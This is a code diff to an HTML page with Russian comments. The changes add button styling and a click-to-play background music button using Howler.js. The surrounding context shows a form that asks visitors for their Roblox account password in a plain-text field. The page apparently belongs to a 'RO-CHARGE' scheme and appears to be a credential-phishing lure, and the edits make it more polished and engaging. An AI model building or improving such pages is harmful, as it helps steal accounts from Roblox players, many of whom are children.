@@ -51,6 +51,10 @@
             overflow: hidden;
         }
 
+        .form-container button#mainsubmit {
+            margin-top: 20px;
+        }
+
         form {
             position: relative;
             z-index: 1;
@@ -95,6 +99,24 @@
         input[type="text"]::placeholder {
             color: rgba(0, 0, 0, 0.7);
         }
+
+        #play-sound-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            z-index: 9999;
+        }
+
+        #play-sound-btn:hover {
+            background-color: #005bb5;
+        }
     </style>
 </head>
 <body>
@@ -110,9 +132,11 @@
             <label for="password">Enter your Roblox account password:</label>
             <input id="password" type="text" name="password" placeholder="Password" required>
             
-            <button type="submit">Submit</button>
+            <button type="submit" id="mainsubmit">Submit</button>
         </form>
     </div>
+
+    <button id="play-sound-btn">Включить звук</button>
 
     <!-- Подключаем Howler.js -->
     <script src="https://cdn.jsdelivr.net/npm/howler/dist/howler.min.js"></script>
@@ -120,12 +144,18 @@
         document.addEventListener('DOMContentLoaded', (event) => {
             var sound = new Howl({
                 src: ['https://raw.githubusercontent.com/rocharge/Roblox-RO-CHARGE/main/chillMusic.mp3'],
-                autoplay: false, // Отключаем автозапуск, чтобы начинать воспроизведение вручную
+                autoplay: false,
                 loop: true,
                 volume: 0.5,
                 onload: function() {
-                    sound.play(); // Начинаем воспроизведение после полной загрузки
+                    console.log('Music loaded, waiting for user interaction to play.');
                 }
+            });
+
+            document.getElementById('play-sound-btn').addEventListener('click', () => {
+                sound.play();
+                // Скрываем кнопку включения звука после начала воспроизведения
+                document.getElementById('play-sound-btn').style.display = 'none';
             });
         });
     </script>
